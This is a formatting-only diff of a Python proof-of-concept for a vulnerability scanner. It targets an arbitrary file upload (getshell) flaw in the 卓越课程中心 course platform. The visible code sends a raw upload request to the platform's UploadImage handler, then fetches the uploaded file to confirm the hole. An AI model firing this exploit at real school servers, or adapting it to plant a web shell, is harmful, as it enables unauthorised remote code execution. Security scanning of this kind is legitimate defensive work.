@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'able_G2S_0001' # 平台漏洞编号，留空
+    vuln_id = 'able_G2S_0001'  # 平台漏洞编号，留空
     name = '卓越课程中心 getshell任意代码执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2015-03-02'  # 漏洞公布时间
     desc = '''
         卓越课程中心 /G2S/AdminSpace/PublicClass/AddVideoCourseWare.ashx?action=UploadImage 可上传任意文件，getshell，影响众多学校。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '卓越课程中心'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '1682e7c8-9f66-4319-b3fc-66f9f5389877'
@@ -30,8 +32,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #ref http://wooyun.org/bugs/wooyun-2010-099059
+
+            # ref http://wooyun.org/bugs/wooyun-2010-099059
             hh = hackhttp.hackhttp()
             raw = """
 POST AdminSpace/PublicClass/AddVideoCourseWare.ashx?action=UploadImage HTTP/1.1
@@ -70,9 +72,9 @@ Submit Query
             if '.asp' not in res or '<' in res:
                 return
             url = arg + '/download/' + res
-            code, head,res, errcode, _ = hh.http(url)
+            code, head, res, errcode, _ = hh.http(url)
             if code == 200 and 'zddfggsfagsdfhdfjskjhsdfkfk' in res:
-                #security_hole(url)
+                # security_hole(url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -81,6 +83,7 @@ Submit Query
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
